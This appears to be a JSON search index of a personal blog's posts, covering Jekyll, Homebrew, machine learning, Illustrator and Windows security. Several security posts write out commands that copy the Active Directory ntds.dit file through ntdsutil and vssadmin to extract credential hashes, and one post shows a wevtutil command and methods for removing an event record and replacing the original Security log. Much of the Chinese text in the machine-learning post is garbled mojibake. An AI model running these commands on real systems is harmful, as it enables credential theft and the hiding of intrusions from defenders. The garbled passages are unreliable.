    "content": "First thing: Jekyll is a static website framework which is useful for building a blog. Jekyll is build by ruby and need to use gem as a package management.FYI: most of the content of the blog is based on the Mike Dane Youtube Channel.1. Installation and Basic StuffInstallation stepsEnvironent: What I choose is using a ruby version manager chruby and ruby-install to aviod change the Opearting system‚Äôs ruby version. Detailsbrew install chruby ruby-installruby-install rubychruby 3.1.0 # change ruby version  Command to new a website: Jekyll new &lt;website-name&gt;.  First time to run the server, bundle exec is a command to execute a script(Gemfile) in the context of the current bundle and change the golbal package version to the specific version in the Gemfile.  Use jekyll serve to run the server.Framework ArchitectureAfter build the website, some key files of the website is like the following items.  _posts: save the blogs.  _layouts: set the layout of interface.  _site: save all the builded static website. Do not need to modify it.  _drafts: save the drafts which do not want to be public. But using jekyll serve --draft will display these drafts in the website.  _config.yml: set the global variables and need to  restart the jekyll server to implement the change in the file.  Gemfile: set the gem package version.The blogs written in markdown in the /_posts path are consisted of two parts: front matter and content.  Front matter:  written in JSON or YAML. Including layout, title, date, categories and so on. And Jekyll will use these variable to set the url of the blog. Besides, custom variable can be added as well.  Content: the main ideas of blogs.The sample of the front matter is like that:---layout: post/pagetitle:  \"Welcome to Jekyll!\"date:   2020-02-03 15:38:48 +0800categories: jekyll updatepermalinks: /about/---We can set default front matter on _config.yml.defaults:\t-\tscope:\t\tpath: \"\"\t\ttype: \"posts\"\t\tvalues:\t\t\tlayout: \"post\"\t\t\ttitle: \"my title\"Hint: If we edit the _config.yml file, we need to restart the jekyll server to see the change on the website.2. Building Your Website2.1 Choose a themeThe quickest way to choose a theme has two steps:(1) Set the theme name on the _config.yml file by theme: minimal-mistakes-jekyll(2) Edit Gemfile to install the related packages: gem \"minimal-mistakes-jekyll\"2.2 LayoutAlso, we can set custom layout by building a layout.html file under the folder _layout.In the layout.html, we can use HTML and Liquid.In the file, content can be used to display the markdown part.2.3 VaribaleWe can use _include folder to save header.html and footer.html.And we can also use site.title and other variable like site.message to use the information form _config.yml.Besides, we can use{% include header.html color%}to cite the header.html file to another file. The variable color can be set in the header.html file by include.color as well.Let‚Äôs take an example.In the header.html:&lt;h1 style=\"color: {{include.color}}\"&gt;{{site.title}}&lt;/h1&gt;&lt;hr&gt;&lt;/hr&gt;In the other files, if we want to cite the header.html file, and loop the variable, the example is like that.&lt;html&gt;&lt;head&gt;\t  &lt;meta charset=\"UTF-8\"&gt;\t  &lt;title&gt;{{site.title}}&lt;/title&gt;&lt;head&gt;&lt;body&gt;\t  {% include header.html color=\"blue\" %}\t{{ content }}    # loop  {% for post in site.posts %}  \t{{ post.title }} &lt;br&gt;  {% endfor%}    # conditional  {% if page.title == \"My First Post\" %}  \tThis is the first post.  {% elsif page.title == \"My Second Post \"%}  \tThis is the second post.  {% else %}  \tThis is another post.  {% endif %}&lt;/body&gt;&lt;/html&gt;2.4 FilesWe can create_data folder to store data files to save all source of information. We can use yml, json or csv. And the way we cite the data is by site.data.column.Another file we can use in Jekyll is static file such as images and pdf by site.static_files and use file.path or file.name to describe these files.If we want to use images in a specific path, we can set the default settings in _config.yml.defaults:\t-\tscope:\t\tpath: \"images/img\"\t\tvalues:\t\t\timage: trueAnd then we can use these images in the other files direcitly.{% for file in site.static_files %}\t{% if file.image %}\t\t&lt;img src=\"{{file.path}}\" alt=\"{file.name}\"&gt;\t{% endif %}{% endofor %}3. Hosting on Github PagesFirst Step: Create a new repository on Github.Second Step: Set base url or domain name in _config.ymlThird Step: set the Jekyll website and sync the github repository.git initgit checkout -b repogit statusgit add .git commit -m \"initial commit\"git remote add origin https://github.... # your github repo pathgit push origin repoFourth Step: Set your repo github pages on the settings.More information about github pages is available here.Jekyll-related Problem Recording1. Busuanzi Counting Prblembusuanzi is a pretty straightforward and easy-using script for website to count the page views. While the single page counter seems not to work incorrectly. I have tried on my own website and visit several other websites on the Internet. It shows that the single page counter just show all pages viewing number instead of separating them.&lt;span id=\"busuanzi_container_page_pv\" style='display:none'&gt;   Read: &lt;span id=\"busuanzi_value_page_pv\"&gt;&lt;/span&gt; Times&lt;/span&gt;"
  },
  
  {
    "title": "How to use Homebrew",
    "url": "/posts/How_to_use_Homebrew/",
    "categories": "",
    "tags": "System",
    "date": "2019-05-21 00:00:00 -0700",
    





    
    "snippet": "HomebrewRecently, I have met with some problems about Homebrew which are very annoyed. I have not spend some times on learning homebrew and reading its documents. I think it is a time to summarize ...",
    "content": "HomebrewRecently, I have met with some problems about Homebrew which are very annoyed. I have not spend some times on learning homebrew and reading its documents. I think it is a time to summarize it and improve the efficiency of using it.1. InstallationGo to the Homebrew Homepage to find the command to install Homebrew. Basically, Homebrew will install all packages and applications under the following paths:  /usr/local/Cellar: install packages and set the link to the /bin directory  /usr/local/Caskroom: install applications2. Supplement Commands2.1 list the path of a specific package: which &lt;package&gt;, most of time it will link to /usr/local/bin/ but ls -la + path is able to display the real path.2.2 get a discription of a package or an application when and where it installed or the dependencies needed to install the package: brew [cask] info &lt;package&gt;/[application]2.3 list the packages installed: brew list2.4 list outdated packages: brew outdated2.5 fetch the update packages and upgrade them: brew update &amp; brew upgrade2.6 remove old versions of packages: brew cleanup2.7 self-dignosis tools: brew doctor2.8 install Mac application: brew cask install &lt;application&gt;2.9 search packages or applications: brew search &lt;application&gt;2.10 go to the homepage of a specific application: brew cask home &lt;application&gt;2.11 install from Github: brew tap &lt;&gt;/brew"
  },
  
  {
    "title": "Machine Learning Summary",
    "url": "/posts/Machine_Learning/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2019-04-12 00:00:00 -0700",
    





    
    "snippet": "I will keep doing researches in adversarial machine learning, so I need to master the basci knowledge stuff. I want to use this blog to record the important and interesting things.Some repositories...",
    "content": "I will keep doing researches in adversarial machine learning, so I need to master the basci knowledge stuff. I want to use this blog to record the important and interesting things.Some repositories which can achieve useful information about how to learn Machine Learning or Tensorflow:  Virgilio  DeepLearning 500 question  TensorFlow Tutorials  Pytorch 60 mins TutorialÊé•‰∏ãÊù•ÔºåÊàëÂ∞ÜÊÄªÁªì‰∏Ä‰∏ãÊú∫Âô®Â≠¶‰π†Áõ∏ÂÖ≥Áü•ËØÜÔºåÂπ∂ËøõË°åÂàÜÊûêÂíåÂèçÊÄù„ÄÇÁ¨¨‰∏ÄËäÇ‰∏ªË¶ÅÊ†πÊçÆ„ÄäMachine Learning in Action„ÄãÁöÑÂÜÖÂÆπÔºå‰ΩÜÊòØËøô‰π¶ËÆ≤ÂæóÂ§™ÁÉÇ‰∫ÜÔºå‰ªãÁªçÁÆóÊ≥ïÊ∑∑‰π±ÔºåÂÆö‰πâ‰∏çÊòéÁ°ÆÔºå‰ª£Á†ÅËøáÊó∂Âπ∂‰∏îÊÑè‰πâ‰∏çÂ§ßÔºåÂºÉ‰πã„ÄÇ‰ΩøÁî®„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„ÄãËøõË°åË°•ÂÖÖÂíåÁªßÁª≠„ÄÇ1. ÂàÜÁ±ª1.1 Âü∫Êú¨Ê¶ÇÂøµÈ¶ñÂÖàÔºå‰ªÄ‰πàÊòØÊú∫Âô®Â≠¶‰π†ÔºüÊú∫Âô®Â≠¶‰π†ÊòØÊääÊó†Â∫èÁöÑÊï∞ÊçÆËΩ¨Êç¢ÊàêÊúâÁî®ÁöÑ‰ø°ÊÅØ„ÄÇÊó†Â∫èÁöÑÊï∞ÊçÆ‰∏ªË¶ÅÂàÜ‰∏∫‰∏§ÁßçÔºöÊï∞ÂÄºÂûãÔºàÊµÆÁÇπÊï∞Ôºâ„ÄÅÂ§öÂÄºÂûãÔºàÊï¥Êï∞Ôºâ„ÄÇËÄåÊú∫Âô®Â≠¶‰π†ÁöÑ‰∏ªË¶Å‰ªªÂä°ÂåÖÊã¨ÂõûÂΩíÔºàÈ¢ÑÊµãÊï∞ÂÄºÂûãÊï∞ÊçÆÔºâÂíåÂàÜÁ±ªÔºàÂ∞ÜÊï∞ÊçÆÂàíÂàÜÂà∞ÂêàÈÄÇÁ±ªÂà´Ôºâ„ÄÇ‰∏§ËÄÖÁöÜÂ±û‰∫éÁõëÁù£Â≠¶‰π†ÔºåÂèäÈúÄË¶ÅÁü•ÈÅì‰ªªÂä°ÁöÑÁ≠îÊ°à„ÄÇËÄåÊó†ÁõëÁù£Â≠¶‰π†ÊòØÂú®Ê≤°ÊúâÁ±ªÂà´‰ø°ÊÅØÊàñÁõÆÊ†áÂÄºÁöÑÊÉÖÂÜµ‰∏ãÈÄöËøáÊï∞ÊçÆÊú¨Ë∫´ËøõË°åËÅöÁ±ª„ÄÇÊé•‰∏ãÊù•‰ªãÁªç‰∏Ä‰∏ãÊú∫Âô®Â≠¶‰π†ÁöÑÂºÄÂèëÊ≠•È™§ÔºöÔºà1ÔºâÊî∂ÈõÜÊï∞ÊçÆÔºöÈÄöËøáÊääÂâç‰∫∫ÂÖ¨ÂºÄÊàñËÄÖËá™Ë°åÁà¨ÂèñÁöÑÊï∞ÊçÆËøõË°åÂΩíÁ∫≥ÊÄªÁªìÔºåÂæóÂà∞ÊúÄÂéüÂßãÁöÑÊï∞ÊçÆÂ∫ì„ÄÇÔºà2ÔºâÂáÜÂ§áÊï∞ÊçÆÔºöÊ†πÊçÆÊú∫Âô®Â≠¶‰π†ÁöÑËæìÂÖ•Ë¶ÅÊ±ÇÔºåÊääÂéüÂßãÊï∞ÊçÆÊ†áÂáÜÂåñ‰ª•ÂèäÊï∞ÈáèÂåñ„ÄÇÔºà3ÔºâÂàÜÊûêÊï∞ÊçÆÔºöÂàÜÊûêÂΩìÂâçËé∑ÂæóÁöÑÊï∞ÊçÆÊòØÂê¶ÂêàÁêÜÔºåÊòØÂê¶Â≠òÂú®Êï∞ÊçÆÂπ≥Ë°°ÊÄßÊàñÊï∞ÊçÆÈáè‰∏çË∂≥ÁöÑÈóÆÈ¢ò„ÄÇÔºà4ÔºâËÆ≠ÁªÉÁÆóÊ≥ïÔºöÊåëÈÄâÂêàÈÄÇÁöÑÊú∫Âô®Â≠¶‰π†ÁÆóÊ≥ïÊàñÊ®°ÂûãËøõË°åËÆ≠ÁªÉÔºåÂπ∂Âú®ËÆ≠ÁªÉËøáÁ®ã‰∏≠Ë∞ÉÊï¥Ë∂ÖÂèÇÊï∞„ÄÇÔºà5ÔºâÂàÜÊûêÁªìÊûúÔºöÂàÜÊûêÂÆûÈ™åÁªìÊûúÁöÑÁúüÂÆûÊÄßÔºåÂèçÂ§çË∞ÉÊï¥Ë∂ÖÂèÇÊï∞ÂíåÊ®°ÂûãÊèêÈ´òÂáÜÁ°ÆÁéáÊàñÊïàÊûú„ÄÇÔºà6ÔºâÂèØËßÜÂåñÂ±ïÁ§∫ÔºöÈÄöËøáÂõæË°®ÊàñÂÖ∂‰ªñÊñπÂºèÂØπÂÆûÈ™åÁªìÊûúËøõË°åÂàÜÊûêÂ±ïÁ§∫„ÄÇÁõÆÂâç‰∏ªË¶ÅÁöÑÊú∫Âô®Â≠¶‰π†ÂºÄÂèëËØ≠Ë®ÄÊòØPythonÔºåÊ≠§Â§ñËøò‰ºöÊ∂âÂèäÂà∞Numpy, Scipy, Matplotlib, PandasÁ≠âÂ∫ìËøõË°åË°•ÂÖÖ„ÄÇ1.2 KNNÁÆóÊ≥ïK‰∏¥ËøëÁÆóÊ≥ïÔºàK-Nearest-NeighborÔºâÊòØÈÄöËøáÊØîËæÉÊï∞ÊçÆÁöÑÁâπÂæÅÂÄº‰πãÈó¥ÁöÑË∑ùÁ¶ªËøõË°åÂàÜÁ±ª„ÄÇËØ•ÁÆóÊ≥ïÁöÑ‰ºòÁÇπÊòØÂØπÂºÇÂ∏∏ÂÄº‰∏çÊòéÊÑüÔºåÁº∫ÁÇπÊòØÊó∂Èó¥Â§çÊùÇÂ∫¶ÂíåÁ©∫Èó¥Â§çÊùÇÂ∫¶È´ò„ÄÇÂÖ∑‰ΩìÊù•ËØ¥ÔºåÈÄöËøáÊääÊï∞ÊçÆÁâπÂæÅÈáèÂåñÂêéÔºåÊ†πÊçÆÁâπÂæÅÁöÑÂ∑ÆÂºÇÂÆö‰πâË∑ùÁ¶ªÔºåÂ∞ÜË∑ùÁ¶ªÊúÄËøëÁöÑÊï∞ÊçÆËÆæÁΩÆÊàêÂêå‰∏ÄÁ±ªÂà´ÁöÑËøáÁ®ã„ÄÇKNNÁÆóÊ≥ïÁöÑ‰º™‰ª£Á†ÅÂ¶Ç‰∏ãÔºöÔºà1ÔºâËÆ°ÁÆóÂ∑≤Áü•Á±ªÂà´Êï∞ÊçÆÈõÜ‰∏≠ÁöÑÊâÄÊúâÁÇπ‰∏éÂΩìÂâçÈúÄË¶ÅÂàÜÁ±ªÁÇπ‰πãÈó¥ÁöÑË∑ùÁ¶ªÔºõÔºà2ÔºâÂ∞ÜÊâÄÊúâÁÇπÊåâË∑ùÁ¶ªËøúËøë‰ªéÂ∞èÂà∞Â§ßÊéíÂàóÔºõÔºà3ÔºâÈÄâÂèñ‰∏éÂΩìÂâçÁÇπË∑ùÁ¶ªÊúÄËøëÁöÑK‰∏™ÁÇπÔºõÔºà4ÔºâÁ°ÆÂÆöËøô‰∫õÁÇπÁöÑÁ±ªÂà´ÔºåËøîÂõûÂá∫Áé∞È¢ëÁéáÊúÄÈ´òÁöÑÁÇπÁöÑÁ±ªÂà´‰Ωú‰∏∫È¢ÑÊµãÁªìÊûúÔºõÊØîËæÉÂü∫Á°ÄÁöÑË∑ùÁ¶ªËÆ°ÁÆóÂÖ¨ÂºèÊòØËÆ°ÁÆóÊ¨ßÂºèË∑ùÁ¶ªÔºåÂç≥Âàù‰∏≠Â≠¶‰π†ÁöÑ‰∏§ÁÇπÈó¥Ë∑ùÁ¶ªÂÖ¨ÂºèÁöÑÂ§öÁª¥Â∫¶Â±ïÂºÄÔºåÂÖ∑‰ΩìÂÖ¨ÂºèÂ¶Ç‰∏ãÔºö\\[distance=\\sqrt{\\sum_{i=0}^{n}(a_i-b_i)^2}\\]ÊòæËÄåÊòìËßÅÔºåKNNÁÆóÊ≥ïÂπ∂‰∏ç‰∏ÄÂÆöËÉΩÂæóÂà∞ÂÆåÂÖ®Ê≠£Á°ÆÁöÑÈ¢ÑÊµãÁªìÊûúÔºåÂõ†Ê≠§ÈúÄË¶ÅÈÄöËøá‰∏Ä‰∫õË°°ÈáèÊ†áÂáÜÊù•ÂÆûÁé∞ÂØπÁÆóÊ≥ïÊïàÊûúÁöÑËØÑ‰º∞„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÈÄöËøáÂáÜÁ°ÆÁéáÂèØ‰ª•ËæÉÁõ¥ËßÇÂú∞‰∫ÜËß£ÂàÜÁ±ªÂô®Âú®ÊüêÊï∞ÊçÆÈõÜ‰∏äÁöÑÊïàÊûúÔºåÂç≥ÂáÜÁ°ÆÁéá=ÂàÜÁ±ªÊ≠£Á°Æ‰∏™Êï∞/ÊÄª‰∏™Êï∞„ÄÇÂú®Â§ÑÁêÜÁâπÂæÅÁöÑËøáÁ®ã‰∏≠ÔºåÈúÄË¶ÅÂØπÊï∞ÊçÆËøõË°åÂΩí‰∏ÄÂåñÂ§ÑÁêÜÔºåÂÖ∂ÂÖ¨ÂºèÂ¶Ç‰∏ãÔºö\\[newValue = \\frac{oldValue-min}{max-min}\\]ÈÄöËøáËØ•ÂÖ¨ÂºèÂèØ‰ª•ÊääÂéüÊú¨ÂèñÂÄºËåÉÂõ¥ÊûÅÂ§ßÁöÑÁâπÂæÅÊò†Â∞ÑÂà∞0Âà∞1‰πãÈó¥„ÄÇ1.3 ÂÜ≥Á≠ñÊ†ëÂÜ≥Á≠ñÊ†ëÊòØÈÄöËøáÈíàÂØπÊï∞ÊçÆÁöÑÁâπÂæÅËøõË°åÂàíÂàÜÂπ∂ÊúÄÁªàÂÆåÊàêÂØπÊï∞ÊçÆÁöÑÂàÜÁ±ªÁöÑ‰∏ÄÁßçÊ†ëÂΩ¢ÁªìÊûÑÔºåÁî±ÁªìÁÇπÂíåÊúâÂêëËæπÁªÑÊàê„ÄÇÁªìÁÇπÂåÖÊã¨ÂÜÖÈÉ®ÁªìÁÇπÔºàË°®Á§∫ÁâπÂæÅÊàñÂ±ûÊÄßÔºâÂíåÂè∂ÁªìÁÇπÔºàÁ±ªÔºâ„ÄÇÂú®Âà§Êñ≠Â¶Ç‰ΩïÂàíÂàÜÊï∞ÊçÆÊó∂ÔºåÈúÄË¶ÅÂºïËøõ‰ø°ÊÅØÁÜµÊàñËÄÖÂü∫Â∞º‰∏çÁ∫ØÂ∫¶(Gini Impurity)Á≠âÊ¶ÇÂøµ„ÄÇÔºà1Ôºâ‰ø°ÊÅØÁÜµÔºåÂç≥‰ø°ÊÅØÁöÑÊúüÊúõÂÄº„ÄÇÂØπ‰∫é\\(x_i\\)ÁöÑ‰ø°ÊÅØÂÆö‰πâ‰∏∫Ôºö\\(l(x_i)=-log_{2}p(x_i)\\)„ÄÇÂÖ∂‰∏≠\\(p(x_i)\\)Ë°®Á§∫ËØ•ÂàÜÁ±ªÁöÑÊ¶ÇÁéá„ÄÇÈÇ£‰πàÊâÄ‰ª•Á±ªÂà´ÂèØËÉΩÂÄºÂåÖÂê´ÁöÑ‰ø°ÊÅØÊúüÊúõÂÄºÔºö\\(H=-\\sum_{i=1}^np(x_i)log_2p(x_i)\\)„ÄÇÂõ†Ê≠§ÔºåÂ¶ÇÊûúÂàíÂàÜ‰πãÂêé‰ø°ÊÅØÁÜµÂèòÂ§ßÔºåÂàôËØ¥ÊòéÊï∞ÊçÆÊõ¥Âä†Êó†Â∫èÔºõÁõ∏ÂèçÂ¶ÇÊûúÁÜµÂÄºÂèò‰ΩéÔºåÂàôËØ¥ÊòéÊï∞ÊçÆÊúâÂ∫èÔºåÂàÜÁ±ªÂêàÁêÜ„ÄÇÔºà2ÔºâÂü∫Â∞º‰∏çÁ∫ØÂ∫¶ÔºöÈÄöËøáÂØπ‰ø°ÊÅØÁÜµÂÆö‰πâ‰∏≠ÁöÑ\\(log_2p(x_i)\\)Ê≥∞ÂãíÂ±ïÂºÄËàçÂºÉÈ´òÈò∂Â∞èÈáèÂæóÂà∞„ÄÇÂõ†Ê≠§ÂèØ‰ª•ÊääÂü∫Â∞º‰∏çÁ∫ØÂ∫¶Áúã‰ΩúÊòØÁÜµÁöÑËøë‰ººÂÄº„ÄÇ\\[Gini(X)=\\sum_{x\\in\\chi}p(x)(1-p(x))\\]ÁõÆÂâç‰∏ªÊµÅÁöÑÂÜ≥Á≠ñÊ†ëÂåÖÊã¨ÔºöID3„ÄÅC4.5„ÄÅCART„ÄÅÈöèÊú∫Ê£ÆÊûóÁ≠â„ÄÇ1.4 Êú¥Á¥†Ë¥ùÂè∂ÊñØÂàÜÁ±ªË¥ùÂè∂ÊñØÂàÜÁ±ªÔºåÂç≥‰ª•Ë¥ùÂè∂ÊñØÂÆöÁêÜ‰∏∫Âü∫Á°ÄËøõË°åÂàÜÁ±ªÔºåËÄåÊú¥Á¥†Ë¥ùÂè∂ÊñØ‰ªΩÈ¢ùÈáåÂàôÊòØÂÖ∂‰∏≠Êúâ‰ª£Ë°®ÊÄßÁöÑ‰∏ÄÁßçÁÆóÊ≥ï„ÄÇÈ¶ñÂÖàÔºåÊ¶ÇÁéáËÆ∫‰∏≠ÈÄöËøáË¥ùÂè∂ÊñØÊ≥ïÂàôÂèØ‰ª•ËÆ°ÁÆóÊù°‰ª∂Ê¶ÇÁéá„ÄÇËã•Ë¶ÅËÆ°ÁÆó\\(c\\)Âú®\\(x\\)ÊÉÖÂÜµ‰∏ãÁöÑÊ¶ÇÁéáÔºåÂàôÂèØ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÂÖ¨ÂºèÔºö\\[\\large{P(c|x)=\\frac{p(x|c)p(c)}{p(x)}}\\]ËÄåÊú¥Á¥†Ë¥ùÂè∂ÊñØÂàÜÁ±ªÂàôÊòØÈÄöËøáËÆ°ÁÆóÊ¶ÇÁéáÊù•ËøõË°åÂàÜÁ±ª„ÄÇÊØîÂ¶ÇÔºåÂú®ÂØπÊñáÊ°£ËøõË°åÂàÜÁ±ªÊó∂Ôºå\\(w\\)‰ª£Ë°®ËØ•ÊñáÊ°£ÁöÑËØçÂêëÈáèÔºå\\(c_i\\)Ë°®Á§∫ÊääËØ•ÊñáÊ°£ÂΩí‰∏∫\\(i\\)Á±ªÔºåÂàôÂÖ¨Âºè‰∏∫Ôºö\\[\\large{P(c_i|w)=\\frac{p(w|c_i)p(c_i)}{p(w)}}\\]ÂÖ∂‰∏≠\\(p(c_i)=\\frac{iÁ±ªÊñáÊ°£Êï∞Èáè}{ÊñáÊ°£ÊÄªÊï∞Èáè}\\)ÔºõÂÅáËÆæÊñáÊ°£‰∏≠ÊâÄÊúâËØçÂá∫Áé∞Ê¶ÇÁéáÁõ∏‰∫íÁã¨Á´ãÔºåÊ†πÊçÆÊú¥Á¥†Ë¥ùÂè∂ÊñØÂÅáËÆæÔºåÈÄöËøáÂ¶Ç‰∏ãÂÖ¨ÂºèÊù•ÁÆÄÂåñËÆ°ÁÆóÔºö \\(p(w\\vert c_i)=p(w_0,w_1,\\ldots ,w_n\\vert c_i)=p(w_0\\vert c_i)p(w_1\\vert c_i)\\ldots p(w_n\\vert c_i)\\)ÔºõÁî±‰∫éÂè™ÈúÄË¶ÅÊØîËæÉÊ¶ÇÁéáÂ§ßÂ∞èÔºåÊâÄ‰ª•\\(p(w)\\)Êó†ÈúÄËÆ°ÁÆó„ÄÇ1.5 LogisticÂõûÂΩí1.6 ÊîØÊåÅÂêëÈáèÊú∫(SVM)1.7 AdaboostÂÖÉÁÆóÊ≥ï‰∏Ä‰∫õÈóÆÈ¢ò1. ÂèçÂêë‰º†Êí≠2. Ê¢ØÂ∫¶Ê∂àÂ§±3."
  },
  
  {
    "title": "Threat Hunting Tools Summary",
    "url": "/posts/Threat_Hunting_Tools_Summary/",
    "categories": "",
    "tags": "Security",
    "date": "2019-01-27 00:00:00 -0800",
    





    
    "snippet": "Recently I am working on searching the threat hunting tools and categoried them. So I writed the blog to save the detail about them.osquery-kolide/fleet/redis-mysqlJustnifferTools List:  Facebook o...",
    "content": "Recently I am working on searching the threat hunting tools and categoried them. So I writed the blog to save the detail about them.osquery-kolide/fleet/redis-mysqlJustnifferTools List:  Facebook osquery  Google GRR  [ELK]  GrayLog  Cyber Wardog Lab  Sysmon  Love  Bro IDSFacebook OsqueryThis is a tool to use sql to get the system information and to record other logs which is able to be used in Linux, Windows or Mac. The goal of osquery is to enable non-developers to access and aggregate data across the disparate sources and to deploy across corporate and production infrastructure.It has several plugins for deployment and development which is very useful for the information collection.Query packs is one of the function that help group to query the function.GRRGRR(Google Rapid Response) is a incident response framework focused on remote live forensics.GRR consists of 2 parts: client and server.ELKelasticSearchGrayLog"
  },
  
  {
    "title": "Adobe Illstrator self learning",
    "url": "/posts/Adobe-Illstrator/",
    "categories": "",
    "tags": "Design",
    "date": "2018-12-27 00:00:00 -0800",
    





    
    "snippet": "Adobe Illstrator is a software to design the web UI or the architecture layout. The reason I use it is to master a way to draw beautiful picture in papers. So I find a tutorial in the Youtube and r...",
    "content": "Adobe Illstrator is a software to design the web UI or the architecture layout. The reason I use it is to master a way to draw beautiful picture in papers. So I find a tutorial in the Youtube and record and summarize the basic knowledge and shortcut about AI.Tutorial Link1. Ten Basic ThingStart the new file from the templateThere are several templates we can use when building a new file. If we want to design a web UI we can choose the web navbar or we can click ‚ÄúMore Settings‚Äù buttom to set the specific detail about the new file. We can set the profile as Custom and then set the artboard number and other things.And another tip is that we can set the artboard name at the bottom of the right side as we can see in the picture3 just like Sketch.Tools      Rectangle tool(Shortcut M) is used to create a rectangle.      - If we hold shift when we create the rectangle, it will be a square. And this tip is also suitable in creating ellipse and circle.     - If we click when using the rectangle tool, we can input the specific number of the width and height.     - We can use Object -&gt; Arrange to move the graph backward or forward.    Drwa a line:          Pen tool: hold shift to draw a perfectly straight line. Clike to get a line and drag to get a curve.      Line segment tool(): draw a line and hold shift to draw.      Pencil tool: draw strokes.            Blob brush tool and Painbrush tool: We can use some pattens in Brush Library to draw some specific lines.        Gradient tool: set gradient color in shapes. We can choose several colors and rotate the gradient.        Shape build tool: group or join in different shapes into one shape.        Free transform tool: change or distort the shape to some special form    Change pixel picture to vector."
  },
  
  {
    "title": "Windows Event Log",
    "url": "/posts/Windows_Event_Log/",
    "categories": "",
    "tags": "Security",
    "date": "2018-11-27 00:00:00 -0800",
    





    
    "snippet": "Windows Event Log default Path: %systemroot%\\system\\winevt\\Logs      Use commands to gain the event log    Wevtutil.exe: retrieve information about event logs and publishers. It can also be used to...",
    "content": "Windows Event Log default Path: %systemroot%\\system\\winevt\\Logs      Use commands to gain the event log    Wevtutil.exe: retrieve information about event logs and publishers. It can also be used to install and uninstall manifests.          Readwevtutil.exe qe Security /f:text /rd:true /c:10: gain the latest 10 rows in security event logs.      Exportwevtutil.exe epl Security 1.evtx: export the whole security event logs to 1.evtx      Export with modificationwevtutil epl Security 1.evtx \"/q:*[System [(EventRecordID!=1112)]]\" : exprot the security event logs to 1.evtx without evnet 1112            Several methods to replace the original logs with the modified one    Method 1: Unlock the original file    Method 2: Injection Loader Dll    Method 3: DuplicateHandle        The whole flow  Source of the whole cpp fileThe problem: how to run the cpp file in the windows without compiler"
  },
  
  {
    "title": "Windows Hash Achievement via VSS",
    "url": "/posts/Windows_Hash_Achievement_via_VSS/",
    "categories": "",
    "tags": "Security",
    "date": "2018-10-29 00:00:00 -0700",
    





    
    "snippet": "The blog introduces and summarizes several ways to get ntds.dit file by vss which is preinstalled in Windows and decrypt the file to get the hash which can be used in other attack. As a result, the...",
    "content": "The blog introduces and summarizes several ways to get ntds.dit file by vss which is preinstalled in Windows and decrypt the file to get the hash which can be used in other attack. As a result, the blog comprises two parts. I use the following two blogs by 3gstudent and ropnop for reference.Export the NTDS.dit via VSSVSS, the abbreviation of Volume Shadow Copy Service, is used to implement the manual or automatic backup copies even when they are in use. It contains a set of COM interfaces that implements a framework to allow volume backups to be performed while applications on a system continue to write to the volumes.Step 1: Acquire the ntds.ditMethod 1: ntdsutil  list snapshots: ntdsutil snapshot \"List All\" quit quit  create snapshotÔºöntdsutil snapshot \"activate instance ntds\" create quit quit  load the snapshot: ntdsutil snapshot \"mount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  copy ntds.dit: copy C:\\$SNAP_201810291848_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit  unload the snapshot: ntdsutil snapshot  \"unmount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  delete the snapshot: ntdsutil snapshot  \"delete {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quitMethod 2: vssadminSupported by windows 2008 or later and Administrator privilege needed  search current existing shadow: vssadmin list shadows  create the shadow: vssadmin create shadow /for=c:  copy ntds.dit: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit c:\\ntds.dit  delete the shadow: vssadmin delete shadows /for=c: /quietMethod 3: vshadowMethod 4: NinjaCopyStep 2: Decrypt the ntds.dit by system hive"
  },
  
  {
    "title": "Permeation Skills",
    "url": "/posts/Permeation_Skills/",
    "categories": "",
    "tags": "Security",
    "date": "2018-09-22 00:00:00 -0700",
    





    
    "snippet": "Basic Knowledge  Active Directory Domain Services is Microsoft‚Äôs Directory Server. It provides authentication and authorization mechanisms as well as a framework within which other related services...",
    "content": "Basic Knowledge  Active Directory Domain Services is Microsoft‚Äôs Directory Server. It provides authentication and authorization mechanisms as well as a framework within which other related services can be deployed (AD Certificate Services, AD Federated Services, etc).  COMLAN Information Collection      WMIC(Windows Management Instructure Commands): WMI provides users with information about the status of local or remote computer systems and supports. It contains aliases, verbs, switches, and commands.          net config workstation: Search for the local machine‚Äôs domain            nltest: NLTEST.EXE is a very powerful command-line utility that can be used to test Trust relationships and the state of Domain Controller replication in a Microsoft Windows NT Domain.  Password Acquirement  Brute Force Tools:          SMBCrack2(2005)      Hydra        Mimikatz: require the administrator privilegeKerberoast Attack  Kerberroast AttackMITMLLMNR/NBNSÊ¨∫È™ó + WPADÂçèËÆÆTools: ResponderDomain Management Privilege Maintainning  Golden Ticket  Silver TicketTutorial: Start-up a active directory  run dcpromo  set password and other proceduresWindows Server 2008 ÁªÑÁΩëÊäÄÊúØ‰∏éÂ∫îÁî®ËØ¶Ëß£1. Ê¥ªÂä®ÁõÆÂΩïÂüüÊúçÂä°1.1 ADÂüüÊúçÂä°ADÂüüÊúçÂä°Áî®‰∫éÊú¨Âú∞ÁΩëÁªúÊ¥ªÂä®ÁõÆÊ†áÁöÑÁÆ°ÁêÜÔºåÂåÖÂê´Ôºö  Âè™ËØªÂûãÂüüÊéßÂà∂Âô® RODC  RMS(ÊùÉÈôêÁÆ°ÁêÜÊúçÂä°)  ËÅîÂêàË∫´‰ªΩÈ™åËØÅÊúçÂä°  ËΩªÂûãÁõÆÂΩïÊúçÂä°Âô®  